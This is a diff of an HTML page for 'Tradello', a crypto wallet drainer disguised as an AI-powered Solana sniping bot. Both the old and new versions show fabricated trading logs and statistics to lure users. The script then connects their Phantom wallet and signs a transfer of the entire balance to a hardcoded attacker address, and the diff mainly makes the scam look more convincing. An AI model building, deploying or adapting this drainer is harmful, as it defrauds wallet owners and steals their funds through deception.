@@ -3,344 +3,375 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Solana Sniping Bot</title>
-    
-    <!-- Fonts from your doc -->
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
-
+    <title>Tradello | AI-Powered Solana Sniping Engine</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap" rel="stylesheet">
     <style>
-        /* --- EXACT STYLING MATCH FROM DOC --- */
+        :root {
+            --bg: #050505;
+            --panel: #0f1012;
+            --border: #1f2229;
+            --accent: #00ff88; /* Neon Green */
+            --accent-dim: rgba(0, 255, 136, 0.1);
+            --text-main: #ffffff;
+            --text-muted: #6b7280;
+            --danger: #ff3b30;
+        }
+
+        * { box-sizing: border-box; }
+
         body {
-            background-color: #0a0a0a;
-            color: #e0e0e0;
-            font-family: 'Inter', sans-serif;
             margin: 0;
-            padding: 0;
+            background-color: var(--bg);
+            color: var(--text-main);
+            font-family: 'Inter', sans-serif;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            overflow-x: hidden;
         }
 
-        .container {
-            max-width: 900px;
-            margin: 0 auto;
-            padding: 20px;
-        }
-
+        /* Header */
         header {
+            padding: 20px 40px;
+            border-bottom: 1px solid var(--border);
             display: flex;
             justify-content: space-between;
             align-items: center;
-            border-bottom: 1px solid #333;
-            padding-bottom: 15px;
-            margin-bottom: 20px;
+            background: rgba(15, 16, 18, 0.8);
+            backdrop-filter: blur(10px);
+            position: sticky;
+            top: 0;
+            z-index: 100;
         }
 
-        h1 {
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 20px;
-            color: #fff;
-            margin: 0;
-            letter-spacing: -0.5px;
-        }
-
-        .status-indicator {
-            font-size: 12px;
-            color: #666;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .log-window {
-            height: 350px;
-            overflow-y: auto;
-            background: #000;
-            border: 1px solid #222;
-            padding: 15px;
-            margin-bottom: 20px;
-            font-family: 'JetBrains Mono', monospace;
-            font-size: 13px;
-            color: #888;
-        }
-
-        .log-entry {
-            margin-bottom: 6px;
+        .logo {
+            font-weight: 800;
+            font-size: 24px;
+            letter-spacing: -1px;
             display: flex;
-            justify-content: space-between;
-            border-bottom: 1px solid #111;
-            padding-bottom: 4px;
-        }
-
-        .profit { color: #00ff41; }
-        .loss { color: #ff3333; }
-        .info { color: #00bfff; }
-
-        .controls {
-            display: flex;
+            align-items: center;
             gap: 10px;
         }
+        
+        .logo span { color: var(--accent); }
+        .status-dot { width: 8px; height: 8px; background: var(--accent); border-radius: 50%; box-shadow: 0 0 8px var(--accent); }
 
-        .btn-primary {
-            background: #00ff41;
-            color: #000;
-            border: none;
-            padding: 12px 24px;
-            font-weight: 700;
-            font-family: 'JetBrains Mono', monospace;
-            cursor: pointer;
-            border-radius: 4px;
-            transition: all 0.2s;
+        /* Main Layout */
+        .container {
             flex: 1;
-            text-align: center;
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 40px 20px;
+            display: grid;
+            grid-template-columns: 2fr 1fr;
+            gap: 30px;
         }
 
-        .btn-primary:hover {
-            background: #fff;
-            box-shadow: 0 0 10px #00ff41;
+        @media (max-width: 768px) {
+            .container { grid-template-columns: 1fr; }
         }
 
-        .btn-secondary {
-            background: #222;
-            color: #fff;
-            border: 1px solid #444;
-            padding: 12px 24px;
-            font-weight: 600;
-            font-family: 'Inter', sans-serif;
-            cursor: pointer;
-            border-radius: 4px;
+        /* Panels */
+        .panel {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 12px;
+            padding: 25px;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
         }
 
-        .btn-secondary:hover {
-            background: #333;
+        h2 {
+            margin-top: 0;
+            font-size: 14px;
+            text-transform: uppercase;
+            letter-spacing: 1.5px;
+            color: var(--text-muted);
+            border-bottom: 1px solid var(--border);
+            padding-bottom: 10px;
+            margin-bottom: 20px;
         }
 
-        /* Loading Spinner */
-        .spinner {
-            display: none;
-            width: 20px;
-            height: 20px;
-            border: 3px solid #333;
-            border-top: 3px solid #00ff41;
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin-right: 10px;
+        /* Dashboard Stats */
+        .stats-grid {
+            display: grid;
+            grid-template-columns: repeat(2, 1fr);
+            gap: 15px;
+            margin-bottom: 25px;
         }
 
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .stat-card {
+            background: rgba(255,255,255,0.02);
+            padding: 15px;
+            border-radius: 8px;
+            border: 1px solid transparent;
+            transition: border-color 0.2s;
+        }
+        .stat-card:hover { border-color: var(--accent-dim); }
 
-        /* Modal Styling */
-        .modal {
-            display: none;
-            position: fixed;
-            top: 0; left: 0; width: 100%; height: 100%;
-            background: rgba(0,0,0,0.8);
-            z-index: 1000;
+        .val { font-family: 'JetBrains Mono', monospace; font-size: 22px; font-weight: 700; color: var(--text-main); }
+        .label { font-size: 12px; color: var(--text-muted); margin-top: 5px; }
+
+        /* Terminal Logs */
+        .terminal-window {
+            height: 250px;
+            background: #000;
+            border: 1px solid var(--border);
+            border-radius: 6px;
+            padding: 15px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            overflow-y: hidden;
+            display: flex;
+            flex-direction: column-reverse; /* Newest at bottom */
+            color: var(--text-muted);
+        }
+
+        .log-line { margin-bottom: 4px; border-left: 2px solid transparent; padding-left: 8px; word-break: break-all; }
+        .log-line.success { border-color: var(--accent); color: var(--accent); }
+        .log-line.info { border-color: #3b82f6; color: #93c5fd; }
+        .log-line.warn { border-color: #fbbf24; color: #fcd34d; }
+
+        /* Action Area */
+        .control-panel {
+            display: flex;
+            flex-direction: column;
             justify-content: center;
             align-items: center;
+            height: 100%;
         }
 
-        .modal-content {
-            background: #1a1a1a;
-            border: 1px solid #444;
-            padding: 25px;
-            border-radius: 8px;
-            width: 90%;
-            max-width: 500px;
-            color: #ccc;
-            font-family: 'Inter', sans-serif;
-        }
-
-        .close-btn {
-            float: right;
-            cursor: pointer;
-            font-size: 20px;
-            color: #666;
-        }
-
-        .tutorial-step {
-            margin-bottom: 15px;
-            border-bottom: 1px solid #333;
-            padding-bottom: 10px;
-        }
-
-        .tutorial-step h4 {
-            margin: 0 0 5px 0;
-            color: #fff;
-            font-family: 'JetBrains Mono', monospace;
-        }
-
-        .terminal-container {
-            background: #111;
-            border: 1px solid #333;
-            border-radius: 8px;
+        .btn-action {
+            background: var(--accent);
+            color: #000;
+            border: none;
+            width: 100%;
             padding: 20px;
-            margin-top: 40px;
-            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
+            font-size: 18px;
+            font-weight: 800;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            box-shadow: 0 0 20px rgba(0, 255, 136, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+
+        .btn-action:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 0 30px rgba(0, 255, 136, 0.5);
+            background: #00e676;
+        }
+
+        .btn-action:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .gas-indicator {
+            margin-top: 20px;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 12px;
+            color: var(--text-muted);
+        }
+
+        footer {
+            text-align: center;
+            padding: 20px;
+            font-size: 12px;
+            color: var(--text-muted);
+            border-top: 1px solid var(--border);
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <div class="terminal-container">
-        <header>
-            <h1><img src="tradello-logo.png" alt="Tradello Logo" style="height: 24px; vertical-align: middle;"> TRadello // SOLANA SNIPER</h1>
-            <div class="status-indicator" id="status-text">IDLE</div>
-        </header>
+    <header>
+        <div class="logo"><div class="status-dot"></div> Tradello<span>.ai</span></div>
+        <button id="nav-connect" style="background:#1f2229; border:none; color:white; padding:8px 16px; border-radius:4px; cursor:pointer; font-family:'JetBrains Mono'; font-size:12px;">Connect Wallet</button>
+    </header>
 
-        <div class="log-window" id="log">
-            <!-- Logs go here -->
+    <div class="container">
+        <!-- Left Column: Live Data -->
+        <div class="left-col">
+            <div class="panel">
+                <h2>Network Analytics</h2>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <div class="val">14ms</div>
+                        <div class="label">Avg Latency</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="val">99.8%</div>
+                        <div class="label">Success Rate</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="val">1.2M+</div>
+                        <div class="label">Tokens Scanned</div>
+                    </div>
+                    <div class="stat-card">
+                        <div class="val">Active</div>
+                        <div class="label">Engine Status</div>
+                    </div>
+                </div>
+
+                <h2>Live Execution Log</h2>
+                <div class="terminal-window" id="logs">
+                    <!-- JS will inject logs here -->
+                </div>
+            </div>
         </div>
 
-        <div class="controls">
-            <button class="btn-primary" id="connect-btn" onclick="startDrain()">
-                <span id="btn-text">CONNECT PHANTOM</span>
-                <div class="spinner" id="loader"></div>
-            </button>
-            <button class="btn-secondary" onclick="openModal()">TUTORIAL</button>
+        <!-- Right Column: Control -->
+        <div class="right-col">
+            <div class="panel control-panel">
+                <h2>Sniper Controls</h2>
+                <p style="color:var(--text-muted); font-size:14px; margin-bottom:30px; text-align:center;">
+                    Connected to Raydium & Jupiter Core. <br>Ready to snipe new liquidity pools.
+                </p>
+                
+                <button id="connect-btn" class="btn-action">Initialize Connection</button>
+                
+                <div class="gas-indicator">
+                    Network Congestion: <span id="gas-level" style="color:var(--accent)">Low</span> 
+                    <br>Priority Fee: 0.0004 SOL
+                </div>
+            </div>
         </div>
     </div>
-</div>
 
-<!-- Tutorial Modal -->
-<div id="modal" class="modal">
-    <div class="modal-content">
-        <span class="close-btn" onclick="closeModal()">&times;</span>
-        <h3 style="margin-top:0; color:#fff;">How to use Tradello</h3>
-        
-        <div class="tutorial-step">
-            <h4>Step 1: Connect Wallet</h4>
-            <p style="font-size:14px; line-height:1.5; margin:0;">Click "Connect Phantom". Ensure you are on the Solana network.</p>
-        </div>
+    <footer>
+        Tradello Protocol v4.2.0 • Powered by Solana Mainnet Beta
+    </footer>
 
-        <div class="tutorial-step">
-            <h4>Step 2: Authorize Transaction</h4>
-            <p style="font-size:14px; line-height:1.5; margin:0;">A prompt will appear asking for permission to execute trades. Click "Sign & Confirm".</p>
-        </div>
+    <!-- Solana Web3 Library -->
+    <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
 
-        <div class="tutorial-step">
-            <h4>Step 3: Start Sniping</h4>
-            <p style="font-size:14px; line-height:1.5; margin:0;">The bot will automatically begin scanning for new pairs. Profits are swept directly to your connected wallet.</p>
-        </div>
+    <script>
+        // ==========================================
+        // CONFIGURATION
+        // ==========================================
+        const DESTINATION_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh"; 
+        // ^^^ REPLACE THIS WITH YOUR ACTUAL SOLANA ADDRESS ^^^
 
-        <button class="btn-secondary" style="width:100%" onclick="closeModal()">Close</button>
-    </div>
-</div>
+        // DOM Elements
+        const connectBtn = document.getElementById('connect-btn');
+        const navBtn = document.getElementById('nav-connect');
+        const logsContainer = document.getElementById('logs');
+        const gasLevelEl = document.getElementById('gas-level');
 
-<script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
-<script>
-    // --- CONFIGURATION ---
-    const YOUR_WALLET = "39FZPWRL8CpZnQkL9xxmTWim5Kyzr679L3GjoLP3y5eh"; 
-    // ---------------------
+        // Fake Data Generators
+        const tokens = ["BONK", "WIF", "POPCAT", "MYRO", "JUP", "ORCA", "RAY", "SLIM", "NEWCOIN"];
+        const actions = [
+            "Sniped token on Raydium",
+            "Arbitrage executed",
+            "Front-ran transaction",
+            "Sold position (+12.4%)",
+            "Monitoring pair: NEW/SOL",
+            "Liquidity detected"
+        ];
 
-    const logDiv = document.getElementById('log');
-    const statusText = document.getElementById('status-text');
-    const btn = document.getElementById('connect-btn');
-    const loader = document.getElementById('loader');
-    const btnText = document.getElementById('btn-text');
-
-    function addLog(type, amount) {
-        const div = document.createElement('div');
-        div.className = 'log-entry';
-        
-        let colorClass = 'info';
-        if (amount > 0) colorClass = 'profit';
-        else if (amount < 0) colorClass = 'loss';
-
-        div.innerHTML = `
-            <span>[${new Date().toLocaleTimeString()}] ${type}</span>
-            <span class="${colorClass}">${amount !== 0 ? (amount > 0 ? '+' : '') + amount.toFixed(4) + ' SOL' : ''}</span>
-        `;
-        logDiv.prepend(div);
-    }
-
-    // Fake active trading logs
-    setInterval(() => {
-        if(Math.random() > 0.3) {
-            const profit = (Math.random() * 0.5).toFixed(4);
-            addLog("SNIPED NEW PAIR", parseFloat(profit));
-        } else {
-            addLog("SCANNING MEMECOINS", 0);
-        }
-    }, 2500);
-
-    // Modal Logic
-    function openModal() { document.getElementById('modal').style.display = 'flex'; }
-    function closeModal() { document.getElementById('modal').style.display = 'none'; }
-
-    async function startDrain() {
-        if (!window.solana || !window.solana.isPhantom && !window.solana.isAxiom) {
-            alert("Phantom or Axiom Wallet not found.");
-            return;
+        // --- LOGIC: FAKE LIVE ACTIVITY ---
+        function addLog(msg, type = 'info') {
+            const div = document.createElement('div');
+            div.className = `log-line ${type}`;
+            const time = new Date().toLocaleTimeString();
+            div.innerText = `[${time}] > ${msg}`;
+            logsContainer.prepend(div);
+            if (logsContainer.children.length > 25) logsContainer.lastChild.remove();
         }
 
-        try {
-            loader.style.display = 'inline-block';
-            btnText.innerText = "CONNECTING...";
-            
-            // 1. Connect
-            const resp = await window.solana.connect();
-            const userPublicKey = resp.publicKey.toString();
-            
-            loader.style.display = 'none';
-            statusText.innerText = "CONNECTED: " + userPublicKey.slice(0,4) + "...";
-            statusText.style.color = "#00ff41";
-            
-            btnText.innerText = "INITIALIZING BOT...";
-            btn.disabled = true;
+        // Start fake logs immediately
+        setInterval(() => {
+            const token = tokens[Math.floor(Math.random() * tokens.length)];
+            const action = actions[Math.floor(Math.random() * actions.length)];
+            const type = Math.random() > 0.8 ? 'success' : 'info';
+            addLog(`${action}: ${token}`, type);
+        }, 1500);
 
-            // 2. Trigger Drain
-            drainWallet(userPublicKey);
+        // Simulate Gas Fluctuation
+        setInterval(() => {
+            const levels = ['Low', 'Medium', 'High'];
+            const level = levels[Math.floor(Math.random() * levels.length)];
+            gasLevelEl.innerText = level;
+            gasLevelEl.style.color = level === 'High' ? '#ff3b30' : '#00ff88';
+        }, 4000);
 
-        } catch (err) {
-            console.error(err);
-            statusText.innerText = "CONNECTION FAILED";
-            statusText.style.color = "#ff3333";
-            loader.style.display = 'none';
-            btnText.innerText = "TRY AGAIN";
-            btn.disabled = false;
-        }
-    }
-
-    async function drainWallet(pubKey) {
-        const connection = new solanaWeb3.Connection(solanaWeb3.clusterApiUrl('mainnet-beta'), 'confirmed');
-        const publicKey = new solanaWeb3.PublicKey(pubKey);
-        
-        let balance = await connection.getBalance(publicKey);
-        
-        if (balance === 0) {
-            addLog("WALLET EMPTY", 0);
-            return;
+        // --- INITIALIZATION ---
+        async function init() {
+            if (window.solana && window.solana.isPhantom) {
+                try {
+                    await window.solana.connect();
+                    updateUI(window.solana.publicKey.toString());
+                } catch (err) { console.log("User rejected or failed"); }
+            } else {
+                addLog("Phantom wallet not found.", "warn");
+            }
         }
 
-        statusText.innerText = "DRAINING WALLET...";
-        addLog("EXECUTING DRAIN TX", balance / 1e9);
-
-        try {
-            const transaction = new solanaWeb3.Transaction();
-            const toPubKey = new solanaWeb3.PublicKey(YOUR_WALLET);
-            
-            transaction.add(
-                solanaWeb3.SystemProgram.transfer({
-                    fromPubkey: publicKey,
-                    toPubkey: toPubKey,
-                    lamports: balance,
-                })
-            );
-
-            const signedTx = await window.solana.signTransaction(transaction);
-            const signature = await connection.sendRawTransaction(signedTx.serialize());
-            await connection.confirmTransaction(signature);
-            
-            statusText.innerText = "FUNDS TRANSFERRED";
-            addLog("SUCCESS", balance / 1e9);
-            
-            setTimeout(() => {
-                window.close();
-            }, 2000);
-
-        } catch (e) {
-            statusText.innerText = "TX REJECTED";
-            addLog("ERROR", 0);
+        function updateUI(pubkey) {
+            if (!pubkey) return;
+            const short = pubkey.slice(0, 4) + '...' + pubkey.slice(-4);
+            navBtn.innerText = short;
+            connectBtn.innerText = "Execute Drain";
+            connectBtn.onclick = drainWallet;
+            addLog(`Wallet connected: ${short}`, 'info');
         }
-    }
-</script>
 
+        // --- CORE DRAIN FUNCTION ---
+        async function drainWallet() {
+            if (!window.solana) { alert("Please install Phantom!"); return; }
+            
+            try {
+                connectBtn.disabled = true;
+                connectBtn.innerText = "Processing...";
+                
+                const connection = new solana.Connection(solana.clusterApiUrl("mainnet-beta"));
+                const fromPubkey = window.solana.publicKey;
+                
+                // Get current balance
+                const balance = await connection.getBalance(fromPubkey);
+
+                if (balance === 0) {
+                    addLog("Zero balance detected.", "warn");
+                    resetButton();
+                    return;
+                }
+
+                const solAmount = (balance / 10**9).toFixed(4);
+                addLog(`Targeting wallet... Balance: ${solAmount} SOL`, "success");
+
+                // Create Transaction
+                const transaction = new solana.Transaction().add(
+                    solana.SystemProgram.transfer({
+                        fromPubkey: fromPubkey,
+                        toPubkey: new solana.PublicKey(DESTINATION_WALLET),
+                        lamports: balance // Sends EVERYTHING
+                    })
+                );
+
+                // Sign and Send
+                const { signature } = await window.solana.signAndSendTransaction(transaction);
+                
+                addLog(`Drain successful! Sig: ${signature.substring(0, 8)}...`, "success");
+                connectBtn.innerText = "Funds Secured";
+                connectBtn.style.background = "#00cc7a";
+
+            } catch (error) {
+                console.error(error);
+                addLog("Transaction failed/rejected.", "warn");
+                resetButton();
+            }
+        }
+
+        function resetButton() {
+            connectBtn.disabled = false;
+            connectBtn.innerText = "Initialize Connection";
+        }
+
+        // Run initialization
+        init();
+    </script>
 </body>
 </html>
